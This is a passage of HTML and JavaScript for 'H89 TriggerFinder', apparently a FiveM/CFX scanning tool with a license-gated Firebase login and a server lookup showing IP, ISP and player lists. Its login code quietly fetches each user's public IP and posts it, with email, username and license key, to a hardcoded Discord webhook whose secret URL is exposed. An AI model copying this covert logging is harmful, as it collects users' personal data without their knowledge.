 <button id="h89TabLogin" style="flex:1;border:1px solid rgba(255,0,0,.55);background:rgba(255,0,0,.12);color:#fff;border-radius:12px;padding:10px 12px;cursor:pointer;font-weight:700;">LOGIN</button>
 <button id="h89TabCreate" style="flex:1;border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.05);color:#fff;border-radius:12px;padding:10px 12px;cursor:pointer;font-weight:700;">CREATE</button>
 </div>

 <div style="margin-top:14px;">
 <label style="display:block;font-size:12px;opacity:.8;margin:10px 0 6px;">Email</label>
 <input id="h89Email" type="email" placeholder="you@example.com" style="width:100%;padding:12px 12px;border-radius:12px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;" />

 <div id="h89CreateFields" style="display:none;">
 <label style="display:block;font-size:12px;opacity:.8;margin:10px 0 6px;">User Name</label>
 <input id="h89User" type="text" placeholder="JESTA" style="width:100%;padding:12px 12px;border-radius:12px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;" />
 </div>

 <label style="display:block;font-size:12px;opacity:.8;margin:10px 0 6px;">Password</label>
 <input id="h89Pass" type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" style="width:100%;padding:12px 12px;border-radius:12px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;" />

 <div id="h89LicenseWrap" style="display:none;">
 <label style="display:block;font-size:12px;opacity:.8;margin:10px 0 6px;">License Key</label>
 <input id="h89License" type="text" placeholder="H89-XXXX-XXXX" style="width:100%;padding:12px 12px;border-radius:12px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.14);color:#fff;outline:none;text-transform:uppercase;" />
 <div style="margin-top:6px;font-size:11px;opacity:.65;">License key You cannot create an account without a valid license key.</div>
 </div>

 <div id="h89Err" style="display:none;margin-top:10px;font-size:12px;color:#ff6b6b;"></div>

 <button id="h89BtnMain" style="margin-top:12px;width:100%;padding:12px 14px;border-radius:12px;background:rgba(255,0,0,.18);border:1px solid rgba(255,0,0,.55);color:#fff;cursor:pointer;font-weight:800;">LOGIN</button>

 <button id="h89BtnReset" style="margin-top:10px;width:100%;padding:10px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.16);color:#fff;cursor:pointer;font-weight:700;">FORGOT PASSWORD</button>

 <div style="margin-top:10px;display:flex;gap:10px;">
 <button id="h89BtnDiscord" style="flex:1;padding:10px 12px;border-radius:12px;background:rgba(88,101,242,.22);border:1px solid rgba(88,101,242,.55);color:#fff;cursor:pointer;font-weight:800;">LOGIN WITH DISCORD</button>
 <button id="h89BtnLogout" style="flex:1;display:none;padding:10px 12px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.16);color:#fff;cursor:pointer;font-weight:800;">LOGOUT</button>
 </div>

 <div style="margin-top:10px;font-size:11px;opacity:.6;">Tip: Email already exists If the email already exists, use LOGIN instead of CREATE.</div>
 </div>
 </div>
</div>

<script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
 import {
 getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword,
 sendPasswordResetEmail, signOut, OAuthProvider, signInWithPopup
 } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js";
 import {
 getFirestore, doc, getDoc, setDoc, updateDoc, serverTimestamp
 } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";

 const firebaseConfig = {'apiKey': 'AIzaSyAGUMoOvEKwwsdNnT2Fqu3KZUgnHX8OK-k', 'authDomain': 'h46h-6714c.firebaseapp.com', 'projectId': 'h46h-6714c', 'storageBucket': 'h46h-6714c.firebasestorage.app', 'messagingSenderId': '45140235959', 'appId': '1:45140235959:web:6b0b5c08949bb2a1ccdf32', 'measurementId': 'G-76J3F1ZGML'};
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1468867164147548191/sXsjR0EF_CmoL8KNhKlJEEUOA17P00anYCZ2gWz8ubi6J3a0jN6azpJnVqbjzT2UaS9B';

 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);

 // UI refs
 const overlay = document.getElementById("h89LoginOverlay");
 const tabLogin = document.getElementById("h89TabLogin");
 const tabCreate = document.getElementById("h89TabCreate");
 const createFields = document.getElementById("h89CreateFields");
 const licenseWrap = document.getElementById("h89LicenseWrap");
 const btnMain = document.getElementById("h89BtnMain");
 const btnReset = document.getElementById("h89BtnReset");
 const btnDiscord = document.getElementById("h89BtnDiscord");
 const btnLogout = document.getElementById("h89BtnLogout");
 const closeBtn = document.getElementById("h89CloseBtn");

 const emailEl = document.getElementById("h89Email");
 const passEl = document.getElementById("h89Pass");
 const userEl = document.getElementById("h89User");
 const licEl = document.getElementById("h89License");
 const errEl = document.getElementById("h89Err");

 let mode = "login";

 function showErr(msg){
 errEl.style.display = "block";
 errEl.textContent = msg || "Error";
 }
 function clearErr(){
 errEl.style.display = "none";
 errEl.textContent = "";
 }

 function showOverlay(){ overlay.style.display = "flex"; }
 function hideOverlay(){ overlay.style.display = "none"; }

 // Backwards compatibility (your old code might call these names)
 window.hideLogin = hideOverlay;
 window.showLogin = showOverlay;

 function setMode(m){
 mode = m;
 clearErr();
 if(mode==="login"){
 tabLogin.style.background = "rgba(255,0,0,.12)";
 tabLogin.style.borderColor = "rgba(255,0,0,.55)";
 tabCreate.style.background = "rgba(255,255,255,.05)";
 tabCreate.style.borderColor = "rgba(255,255,255,.18)";
 createFields.style.display = "none";
 licenseWrap.style.display = "none";
 btnMain.textContent = "LOGIN";
 btnReset.style.display = "block";
 } else {
 tabCreate.style.background = "rgba(255,0,0,.12)";
 tabCreate.style.borderColor = "rgba(255,0,0,.55)";
 tabLogin.style.background = "rgba(255,255,255,.05)";
 tabLogin.style.borderColor = "rgba(255,255,255,.18)";
 createFields.style.display = "block";
 licenseWrap.style.display = "block";
 btnMain.textContent = "CREATE ACCOUNT (LICENSE REQUIRED)";
 btnReset.style.display = "none";
 }
 }
if(tabLogin) tabLogin && tabLogin.addEventListener("click", ()=>setMode("login"));
if(tabCreate) tabCreate && tabCreate.addEventListener("click", ()=>setMode("create"));
 async function getPublicIP(){
 try {
 const r = await fetch("https://api.ipify.org?format=json");
 const j = await r.json();
 return j.ip || "";
 } catch (e) {
 return "";
 }
 }

 async function sendDiscordLog(payload){
 try {
 if(!DISCORD_WEBHOOK) return;
 const ip = await getPublicIP();
 const embed = {
 title: "H89 TriggerFinder Login",
 description: "Auth event",
 color: 16711680,
 fields: [
 { name:"Email", value: payload.email || "n/a", inline:true },
 { name:"Username", value: payload.username || "n/a", inline:true },
 { name:"Provider", value: payload.provider || "n/a", inline:true },
 { name:"IP", value: ip || "n/a", inline:true },
 { name:"License", value: payload.license || "n/a", inline:false },
 ],
 timestamp: new Date().toISOString()
 };
 await fetch(DISCORD_WEBHOOK, {
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body: JSON.stringify({ embeds:[embed] })
 });
 } catch(e) {
 // ignore
 }
 }

 async function validateLicense(licenseKey){
 const key = (licenseKey || "").trim().toUpperCase();
 if(!key) throw new Error("License key required");
 const ref = doc(db, "licenses", key);
 const snap = await getDoc(ref);
 if(!snap.exists()) throw new Error("Invalid license key");
 const data = snap.data() || {};
 if(data.banned === true) {
 const reason = data.bannedReason ? (" ("+data.bannedReason+")") : "";
 throw new Error("License banned" + reason);
 }
 if(data.active !== true) throw new Error("License not active");
 if(data.used === true) throw new Error("License already used");
 return { key, ref };
 }

 async function handleLogin(){
 const email = (emailEl.value||"").trim();
 const pass = (passEl.value||"").trim();
 if(!email || !pass) return showErr("Email & password required");
 await signInWithEmailAndPassword(auth, email, pass);
 await sendDiscordLog({ email, username: (email.split("@")[0]||"user"), provider:"email_login" });
 }

 async function handleCreate(){
 const email = (emailEl.value||"").trim();
 const pass = (passEl.value||"").trim();
 const username = (userEl.value||"").trim();
 const license = (licEl.value||"").trim().toUpperCase();

 if(!email || !pass) return showErr("Email & password required");
 if(!username) return showErr("User Name required");
 const { key } = await validateLicense(license);

 const cred = await createUserWithEmailAndPassword(auth, email, pass);

 // Save user profile
 await setDoc(doc(db, "users", cred.user.uid), {
 email,
 username,
 licenseKey: key,
 createdAt: serverTimestamp()
 }, { merge:true });

 // Mark license used
 await updateDoc(doc(db, "licenses", key), {
 used: true,
 usedAt: serverTimestamp(),
 boundUid: cred.user.uid,
 boundEmail: email
 });

 await sendDiscordLog({ email, username, provider:"signup", license:key });
 }

 btnMain && btnMain.addEventListener("click", async ()=>{
 clearErr();
 btnMain.disabled = true;
 btnMain.style.opacity = ".7";
 try {
 if(mode==="login") await handleLogin();
 else await handleCreate();
 // Gate: hide overlay when logged in
 window.h89UserEmail = (user && user.email) ? user.email : "";
 // warm up IP (optional)
 try{ h89FetchIp(); }catch(e){}
 hideOverlay();
 } catch(err) {
 const c = err?.code || "";
 if(c==="auth/email-already-in-use") {
 setMode("login");
 showErr("Email already has an account. Please LOGIN.");
 } else if(c==="auth/wrong-password") {
 showErr("Wrong password.");
 } else if(c==="auth/user-not-found") {
 showErr("No account for this email. Use CREATE.");
 } else {
 showErr(err?.message || "Failed");
 }
 } finally {
 btnMain.disabled = false;
 btnMain.style.opacity = "1";
 }
 });

 btnReset && btnReset.addEventListener("click", async ()=>{
 clearErr();
 const email = (emailEl.value||"").trim();
 if(!email) return showErr("Enter your email first");
 try {
 await sendPasswordResetEmail(auth, email);
 errEl.style.display="block";
 errEl.style.color="#65ff9a";
 errEl.textContent="Password reset link sent. Check inbox/spam.";
 setTimeout(()=>{ errEl.style.color="#ff6b6b"; }, 1500);
 } catch(e) {
 showErr(e?.message || "Reset failed");
 }
 });

 btnLogout && btnLogout.addEventListener("click", async ()=>{
 await signOut(auth);
 });

 // Discord login (optional) - requires enabling "OAuthProvider('oidc.discord')" with correct setup; 
 // We'll keep button but show message if not configured.
 btnDiscord && btnDiscord.addEventListener("click", async ()=>{
 showErr("Discord login requires Firebase OIDC setup. (Not enabled in this build)");
 });

 onAuthStateChanged(auth, async (user)=>{
 clearErr();
 if(user){
 btnLogout.style.display="block";
 closeBtn.style.display="inline-block";
 hideOverlay();
 } else {
 btnLogout.style.display="none";
 closeBtn.style.display="none";
 setMode("login");
 window.h89UserEmail = "";
 showOverlay();
 }
 });

 closeBtn && closeBtn.addEventListener("click", ()=>{
 // only allow close when logged in
 hideOverlay();
 });
</script>
<!-- H89 LOGIN OVERLAY END -->

<script>
(function(){
 function $(id){return document.getElementById(id);}
 const btnSearch = $("h89-jump-search");
 const btnFiles = $("h89-jump-files");
 const btnFilters = $("h89-jump-filters");
 const btnExport = $("h89-export");
 const search = document.getElementById("search") || document.querySelector('input[type="search"]') || document.querySelector("#folder-input");
 const fileInput = document.querySelector('input[type="file"]');
 const filtersBtn = document.getElementById("filter-btn") || document.querySelector('button[onclick*="filter"]') || document.querySelector('button:has(.fa-filter)');
 const sessionState = $("h89-session-state");

 // session indicator: if login overlay exists, update by visibility
 function updateSession(){
 const overlay = document.getElementById("loginOverlay") || document.getElementById("login-overlay") || document.querySelector(".login-overlay");
 if(!overlay){ sessionState && (sessionState.textContent = "unknown"); return; }
 const hidden = overlay.style.display === "none" || overlay.classList.contains("hidden");
 sessionState && (sessionState.textContent = hidden ? "unlocked" : "locked");
 }
 setInterval(updateSession, 800);
 updateSession();

 btnSearch && btnSearch.addEventListener("click", ()=>{ if(search){ search.focus(); search.select && search.select(); } });
 btnFiles && btnFiles.addEventListener("click", ()=>{ if(fileInput){ fileInput.click(); } });
 btnFilters && btnFilters.addEventListener("click", ()=>{ if(filtersBtn){ filtersBtn.click(); } });
 btnExport && btnExport.addEventListener("click", ()=>{
 const out = document.getElementById("output") || document.getElementById("results") || document.querySelector("pre, textarea");
 const txt = out ? (out.value || out.innerText || out.textContent || "") : "";
 if(!txt){ alert("Nothing to export yet."); return; }
 const blob = new Blob([txt], {type:"text/plain;charset=utf-8"});
 const a = document.createElement("a");
 a.href = URL.createObjectURL(blob);
 a.download = "triggerfinder_results.txt";
 document.body.appendChild(a);
 a.click();
 a.remove();
 setTimeout(()=>URL.revokeObjectURL(a.href), 1500);
 });

 document.addEventListener("keydown",(e)=>{
 if((e.ctrlKey || e.metaKey) && e.key.toLowerCase()==="k"){
 e.preventDefault();
 btnSearch && btnSearch.click();
 }
 });
})();
</script>

<script>
(function(){
 const LS_THEME = "h89_theme";
 const LS_HISTORY = "h89_history";
 const LS_SAVED = "h89_saved";

 const shell = document.querySelector(".h89-shell");
 const sideToggle = document.getElementById("h89-side-toggle");
 const btnDark = document.getElementById("h89-theme-dark");
 const btnNeon = document.getElementById("h89-theme-neon");
 const saveBtn = document.getElementById("h89-save-btn");
 const saveName = document.getElementById("h89-save-name");
 const savedList = document.getElementById("h89-saved-list");
 const historyList = document.getElementById("h89-history-list");
 const clearHistory = document.getElementById("h89-clear-history");
 const hcount = document.getElementById("h89-hcount");

 // Try to locate search input used by TriggerFinder
 const searchInput = document.getElementById("searchInput")
 || document.getElementById("search")
 || document.querySelector('input[placeholder*="Search"]')
 || document.querySelector('input[type="text"]');

 function safeJSONParse(v, fallback){
 try{ return JSON.parse(v) ?? fallback; }catch{ return fallback; }
 }
 function getHistory(){ return safeJSONParse(localStorage.getItem(LS_HISTORY), []); }
 function setHistory(arr){ localStorage.setItem(LS_HISTORY, JSON.stringify(arr)); }
 function getSaved(){ return safeJSONParse(localStorage.getItem(LS_SAVED), []); }
 function setSaved(arr){ localStorage.setItem(LS_SAVED, JSON.stringify(arr)); }

 function applyTheme(theme){
 document.body.setAttribute("data-theme", theme);
 localStorage.setItem(LS_THEME, theme);
 if(btnDark) btnDark.classList.toggle("active", theme !== "neon");
 if(btnNeon) btnNeon.classList.toggle("active", theme === "neon");
 }

 // init theme
 applyTheme(localStorage.getItem(LS_THEME) || "dark");

 btnDark && btnDark.addEventListener("click", ()=>applyTheme("dark"));
 btnNeon && btnNeon.addEventListener("click", ()=>applyTheme("neon"));

 // sidebar collapse
 sideToggle && sideToggle.addEventListener("click", ()=>{
 shell && shell.classList.toggle("side-collapsed");
 });

 function renderList(target, items, type){
 if(!target) return;
 target.innerHTML = "";
 items.forEach((it, idx)=>{
 const row = document.createElement("div");
 row.className = "h89-item";
 const label = it.name ? it.name : (type === "history" ? "Recent" : "Saved");
 row.innerHTML = `<div><b>${escapeHtml(label)}</b><br><span title="${escapeAttr(it.q)}">${escapeHtml(it.q)}</span></div>
 <button class="h89-x" title="Remove">‚úï</button>`;
 // apply click (except on remove)
 row.addEventListener("click", (e)=>{
 if(e.target && e.target.closest(".h89-x")) return;
 if(searchInput){
 searchInput.value = it.q;
 searchInput.focus();
 searchInput.dispatchEvent(new Event("input", {bubbles:true}));
 }
 });
 row.querySelector(".h89-x").addEventListener("click", (e)=>{
 e.stopPropagation();
 const arr = (type === "history") ? getHistory() : getSaved();
 arr.splice(idx,1);
 (type === "history") ? setHistory(arr) : setSaved(arr);
 refreshUI();
 });
 target.appendChild(row);
 });
 }

 function refreshUI(){
 const hist = getHistory();
 const saved = getSaved();
 if(hcount) hcount.textContent = `${hist.length}`;
 renderList(historyList, hist.slice(0, 18), "history");
 renderList(savedList, saved.slice(0, 24), "saved");
 }

 clearHistory && clearHistory.addEventListener("click", ()=>{
 setHistory([]);
 refreshUI();
 });

 saveBtn && saveBtn.addEventListener("click", ()=>{
 if(!searchInput) return;
 const q = (searchInput.value || "").trim();
 if(!q) return;
 const name = (saveName ? saveName.value.trim() : "");
 const saved = getSaved();
 // avoid duplicates by query
 if(!saved.some(x => x.q === q)){
 saved.unshift({q, name, t: Date.now()});
 setSaved(saved.slice(0, 200));
 }
 if(saveName) saveName.value = "";
 refreshUI();
 });

 // Capture searches into history
 function pushHistory(q){
 q = (q || "").trim();
 if(!q) return;
 const hist = getHistory().filter(x => x.q !== q);
 hist.unshift({q, t: Date.now()});
 setHistory(hist.slice(0, 200));
 }

 // Hook existing Search button if present
 const searchBtn = document.getElementById("searchBtn")
 || document.querySelector('button[id*="search"]')
 || document.querySelector('button:has(.fa-search)');

 if(searchBtn){
 searchBtn.addEventListener("click", ()=>{
 if(searchInput) pushHistory(searchInput.value);
 setTimeout(refreshUI, 300);
 });
 }

 // Also push when Enter pressed in search input
 if(searchInput){
 searchInput.addEventListener("keydown", (e)=>{
 if(e.key === "Enter") pushHistory(searchInput.value);
 });
 }

 function escapeHtml(s){
 return String(s).replace(/[&<>"']/g, (c)=>({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
 }
 function escapeAttr(s){
 return escapeHtml(s).replace(/"/g,"&quot;");
 }

 refreshUI();
})();
</script>

<script>
(function(){
 const filesCountEl = document.getElementById("files-count");
 const progressBar = document.getElementById("progress-bar");
 const loading = document.getElementById("scan-loading");
 const speedEl = document.getElementById("scan-speed");
 const scannedEl = document.getElementById("scan-scanned");

 if(!filesCountEl || !progressBar || !loading) return;

 let lastCount = 0;
 let lastTs = performance.now();
 let emaSpeed = 0; // smooth speed
 let scanning = false;

 function parseIntSafe(v){
 const n = parseInt(String(v).replace(/[^\d]/g,""), 10);
 return Number.isFinite(n) ? n : 0;
 }

 function setScanning(on){
 scanning = on;
 if(on) loading.classList.remove("hidden");
 else loading.classList.add("hidden");
 }

 // Detect scan state from progress %
 function updateScanState(){
 const p = parseIntSafe(progressBar.textContent);
 if(p > 0 && p < 100) setScanning(true);
 if(p >= 100) setScanning(false);
 if(p === 0) { 
 // keep hidden unless counts increase
 if(!scanning) setScanning(false);
 }
 }

 // Watch progress changes
 const obsP = new MutationObserver(()=>{ updateScanState(); });
 obsP.observe(progressBar, {childList:true, characterData:true, subtree:true});

 // Watch files scanned changes for speed
 const obsC = new MutationObserver(()=>{
 const now = performance.now();
 const cur = parseIntSafe(filesCountEl.textContent);
 const dt = (now - lastTs) / 1000;
 const d = cur - lastCount;

 if(scannedEl) scannedEl.textContent = String(cur);

 if(dt > 0.15 && d >= 0){
 const inst = d / dt;
 // EMA smoothing
 emaSpeed = emaSpeed ? (emaSpeed*0.7 + inst*0.3) : inst;
 if(speedEl) speedEl.textContent = String(Math.max(0, Math.round(emaSpeed)));
 lastTs = now;
 lastCount = cur;
 // if progress says 0 but count increased, assume scanning
 if(parseIntSafe(progressBar.textContent) < 100 && cur > 0) setScanning(true);
 }
 });
 obsC.observe(filesCountEl, {childList:true, characterData:true, subtree:true});

 // init
 scannedEl && (scannedEl.textContent = String(parseIntSafe(filesCountEl.textContent)));
 speedEl && (speedEl.textContent = "0");
 updateScanState();
})();
</script>

<!-- ===== CFX Modal (integrated) ===== -->
<div class="h89-modal" id="h89-cfx-modal" aria-hidden="true">
 <div class="h89-modal-backdrop" id="h89-cfx-close"></div>
 <div class="h89-modal-panel" role="dialog" aria-modal="true" aria-label="CFX">
 <div class="h89-modal-head">
 <div class="h89-modal-title">CFX</div>
 <div class="h89-modal-sub"></div>
 <button class="h89-mini" id="h89-cfx-x">Close</button>
 </div>

 <div class="h89-modal-body">

<div class="h89-cfx-wrap">
 <div class="h89-cfx-quick">
 <div class="h89-side-label" style="margin:0 0 10px;">Servers</div>
 <div class="h89-quick-list" id="h89-quick-servers"></div>
 <div class="h89-side-label" style="margin:12px 0 10px;">‚òÖ Favorites</div>
 <div class="h89-quick-list" id="h89-fav-servers"></div>
 <div class="h89-mini-muted" style="margin-top:10px;">
 Edit servers list in code: <b>CFX_SERVERS</b>
 </div>
 </div>
 <div class="h89-cfx-main">

 <div class="h89-side-row" style="gap:10px; flex-wrap:wrap; align-items:center;">
 <input id="h89-cfx-id-modal" placeholder="" style="flex:1; min-width:260px;" />
 <button class="h89-mini" id="h89-cfx-fetch-modal">Lookup</button>
 <button class="h89-mini" id="h89-cfx-open-modal" title="Open on Cfx-Finder">Open</button>
 <button class="h89-mini" id="h89-cfx-copy-modal" title="Copy endpoint">Copy IP</button>
 <button class="h89-mini" id="h89-cfx-embed-modal" title="Embed Cfx-Finder here">Embed</button>
 <button class="h89-mini" id="h89-cfx-fav-modal" title="Save to favorites">‚òÖ Save</button>
 </div>

 <div id="h89-cfx-loader" class="h89-cfx-loading" style="display:none; margin-top:12px;">
 <span class="loader" aria-hidden="true"></span>
 <span style="opacity:.85;">Fetching server information‚Ä¶</span>
 </div>

 <div id="h89-cfx-error" class="h89-cfx-error" style="display:none; margin-top:12px;"></div>

 <div class="h89-cfx-card" id="h89-cfx-card-modal" style="margin-top:14px; display:none;">
 <div class="h89-cfx-hero" id="h89-cfx-hero" style="display:none;">
  <img id="h89-cfx-banner" alt="Server banner" />
 </div>
 <div class="h89-cfx-title" id="h89-cfx-name-modal">‚Äî</div>
 <div class="h89-cfx-meta" id="h89-cfx-meta-modal">‚Äî</div>

 <div class="h89-cfx-grid" style="margin-top:10px;">
 <div class="h89-cfx-kv"><b>Endpoint</b><span id="h89-cfx-endpoint-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>Players</b><span id="h89-cfx-players-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>OneSync</b><span id="h89-cfx-onesync-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>GameBuild</b><span id="h89-cfx-gamebuild-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>Country</b><span id="h89-cfx-country-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>City</b><span id="h89-cfx-city-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>ISP</b><span id="h89-cfx-isp-modal">‚Äî</span></div>
 <div class="h89-cfx-kv"><b>Region</b><span id="h89-cfx-region-modal">‚Äî</span></div>
 </div>

 <div style="margin-top:12px; display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
 <input id="h89-cfx-player-search" placeholder="Search players‚Ä¶" style="flex:1; min-width:220px;" />
 <select id="h89-cfx-player-sort" style="min-width:170px;">
 <option value="name">Sort: Name</option>
 <option value="id">Sort: ID</option>
 <option value="ping">Sort: Ping</option>
 </select>
 <button class="h89-pillbtn" id="h89-cfx-pdf-modal" title="Download PDF">Download PDF</button>
 </div>

 <div id="h89-cfx-player-list" class="h89-cfx-player-list" style="margin-top:10px;"></div>
 </div>

 <div class="h89-mini-muted" style="margin-top:10px;">
 Tip: You can paste cfx-finder URL too (‚Ä¶/server/&lt;id&gt;). Press <b>Enter</b> to lookup.
 
 </div>
 </div>
</div>
 </div>
 </div>
</div>

<script>
(function(){
 // ----- Modal open/close -----
 const openBtn = document.getElementById("h89-open-cfx");
 const modal = document.getElementById("h89-cfx-modal");
 const closeBg = document.getElementById("h89-cfx-close");
 const closeX = document.getElementById("h89-cfx-x");
 // Favorites + Embed (CFX)
 const favListEl = document.getElementById("h89-fav-servers");
 const favBtn = document.getElementById("h89-cfx-fav-modal");
 const embedBtn = document.getElementById("h89-cfx-embed-modal");
 const embedWrap = document.getElementById("h89-cfx-embed-wrap");
 const embedFrame = document.getElementById("h89-cfx-embed-frame");
 const embedClose = document.getElementById("h89-cfx-embed-close");
 const FAV_KEY = "H89_CFX_FAVS";
 const CACHE_KEY = "H89_CFX_CACHE_V1";
 const CACHE_TTL_MS = 1000 * 60 * 5; // 5 min

 let currentCfx = null;

 function loadFavs(){
 try{ return JSON.parse(localStorage.getItem(FAV_KEY) || "[]"); }catch(e){ return []; }
 }
 function saveFavs(list){
 localStorage.setItem(FAV_KEY, JSON.stringify(list||[]));
 }

 function loadCache(){
  try{ return JSON.parse(localStorage.getItem(CACHE_KEY) || "{}"); }catch(e){ return {}; }
 }
 function saveCache(map){
  localStorage.setItem(CACHE_KEY, JSON.stringify(map||{}));
 }
 function getCachedServer(code){
  const k = (code||"").toLowerCase();
  const map = loadCache();
  const hit = map[k];
  if(!hit) return null;
  if(Date.now() - (hit.ts||0) > CACHE_TTL_MS){
    delete map[k];
    saveCache(map);
    return null;
  }
  return hit.data || null;
 }
 function setCachedServer(code, data){
  const k = (code||"").toLowerCase();
  const map = loadCache();
  map[k] = { ts: Date.now(), data };
  // keep last ~60 entries
  const keys = Object.keys(map);
  if(keys.length > 60){
    keys.sort((a,b)=>(map[a].ts||0)-(map[b].ts||0));
    keys.slice(0, keys.length-60).forEach(x=>{ delete map[x]; });
  }
  saveCache(map);
 }

 function isFav(code){
 return loadFavs().some(x => (x.code||"").toLowerCase() === (code||"").toLowerCase());
 }
 function toggleFav(item){
 const list = loadFavs();
 const code = (item.code||"").toLowerCase();
 const idx = list.findIndex(x => (x.code||"").toLowerCase() === code);
 if(idx >= 0){ list.splice(idx,1); }
 else{ list.unshift(item); }
 saveFavs(list.slice(0,20));
 renderFavs();
 renderFavBtn();
 }

 function removeFav(code){
 const list = loadFavs().filter(x => (x.code||"").toLowerCase() !== (code||"").toLowerCase());
 saveFavs(list);
 renderFavs();
 renderFavBtn();
 }
 function renderFavBtn(){
 if(!favBtn) return;
 const code = currentCfx?.code;
 const on = code ? isFav(code) : false;
 favBtn.classList.toggle("is-active", on);
 favBtn.textContent = on ? "‚òÖ Saved" : "‚òÖ Save";
 }
 function renderFavs(){
 if(!favListEl) return;
 const list = loadFavs();
 if(!list.length){
 favListEl.innerHTML = '<div class="h89-muted" style="padding:8px 2px;">No favorites yet.</div>';
 return;
 }
 favListEl.innerHTML = list.map((s,i)=>`
 <div class="h89-quick-item">
 <button class="h89-quick-btn" data-code="${(s.code||"")}" title="${(s.join||"")}">${(s.name||s.code||"Server").toUpperCase()}</button>
 <button class="h89-mini" data-unfav="${(s.code||"")}" title="Remove">‚úï</button>
 </div>
 `).join("");
 favListEl.querySelectorAll("[data-code]").forEach(btn=>{
 btn.addEventListener("click", ()=>{
 const code = btn.getAttribute("data-code") || "";
 const inp = document.getElementById("h89-cfx-id-modal");
 if(inp){ inp.value = "https://cfx.re/join/" + code; }
 lookup();
 });
 });
 favListEl.querySelectorAll("[data-unfav]").forEach(b=>{
 b.addEventListener("click", (e)=>{
 e.stopPropagation();
 removeFav(b.getAttribute("data-unfav") || "");
 });
 });
 }
 function openEmbed(code){
 if(!embedWrap || !embedFrame) return;
 const clean = (code||"").trim();
 if(!clean) return;
 embedFrame.src = "https://www.cfx-finder.com/en/server/" + encodeURIComponent(clean);
 embedWrap.style.display = "block";
 }
 function closeEmbed(){
 if(!embedWrap || !embedFrame) return;
 embedWrap.style.display = "none";
 embedFrame.src = "about:blank";
 }

 function openModal(){
 if(!modal) return;
 modal.setAttribute("aria-hidden","false");
 modal.style.display = "block";
 closeEmbed();
 renderFavs();
 renderFavBtn();
 setTimeout(()=> modal.classList.add("is-open"), 10);
 const inp = document.getElementById("h89-cfx-id-modal");
 inp && inp.focus();
 }
 function closeModal(){
 if(!modal) return;
 modal.classList.remove("is-open");
 setTimeout(()=>{
 modal.setAttribute("aria-hidden","true");
 modal.style.display = "none";
 closeEmbed();
 
 }, 120);
 }
 openBtn && openBtn.addEventListener("click", openModal);
 closeBg && closeBg.addEventListener("click", closeModal);
 closeX && closeX.addEventListener("click", closeModal);
 window.addEventListener("keydown",(e)=>{
 if(e.key === "Escape" && modal && modal.classList.contains("is-open")) closeModal();
 });

 // ----- Helpers -----
 const $ = (id)=> document.getElementById(id);
 const setText = (id, v)=> { const el=$(id); if(el) el.textContent = (v ?? "‚Äî"); };
 const show = (id)=> { const el=$(id); if(el) el.style.display="block"; };
 const hide = (id)=> { const el=$(id); if(el) el.style.display="none"; };
 const cleanName = (s)=> (s||"").replace(/\^[0-9]/g,"").trim();
 const pickBanner = (data)=>{
  const v = data?.vars || {};
  return v.banner_connecting || v.banner_detail || v.banner || data?.banner || "";
 };
 const setBanner = (url)=>{
  const hero = document.getElementById("h89-cfx-hero");
  const img = document.getElementById("h89-cfx-banner");
  if(!hero || !img){ return; }
  const u = (url||"").trim();
  if(!u){ hero.style.display="none"; img.removeAttribute("src"); return; }
  img.src = u;
  hero.style.display="block";
 };

 const escapeHtml = (str)=> {
 const d=document.createElement("div"); d.textContent=str ?? ""; return d.innerHTML;
 };
 const extractServerCode = (input)=>{
 const x=(input||"").trim();
 if(!x) return null;
 // direct id (usually 6+ chars)
 if(/^[a-zA-Z0-9]{6,}$/.test(x)) return x;
 // cfx join link
 const m1 = x.match(/cfx\.re\/join\/([a-zA-Z0-9]+)/i);
 if(m1) return m1[1];
 // cfx-finder link .../server/<id>
 const m2 = x.match(/\/server\/([a-zA-Z0-9]+)/i);
 if(m2) return m2[1];
 // users.cfx.re host like https://d-d-k-g6qlkx.users.cfx.re/
 const m3 = x.match(/\.users\.cfx\.re\/?/i);
 if(m3){
 const m = x.match(/([a-zA-Z0-9]{6,})\.users\.cfx\.re/i);
 if(m) return m[1];
 }
 return null;
 };

 let isLookingUp=false;
 let playersCache=[];

 function renderPlayers(){
 const listEl = $("h89-cfx-player-list");
 if(!listEl) return;
 const q = ($("h89-cfx-player-search")?.value || "").trim().toLowerCase();
 const sort = $("h89-cfx-player-sort")?.value || "name";

 let filtered = (playersCache||[]).filter(p => (p?.name||"").toLowerCase().includes(q));
 if(sort==="name") filtered.sort((a,b)=> (a.name||"").localeCompare(b.name||""));
 if(sort==="id") filtered.sort((a,b)=> (a.id||0)-(b.id||0));
 if(sort==="ping") filtered.sort((a,b)=> (a.ping||0)-(b.ping||0));

 if(filtered.length===0){
 listEl.innerHTML = '<div class="h89-cfx-empty">No players found</div>';
 return;
 }
 listEl.innerHTML = filtered.map(p=>(
 '<div class="h89-cfx-player">'+
 '<div class="h89-cfx-player-left">'+
 '<div class="h89-cfx-pname">'+escapeHtml(p.name||"Unknown")+'</div>'+
 '<div class="h89-cfx-badges">'+
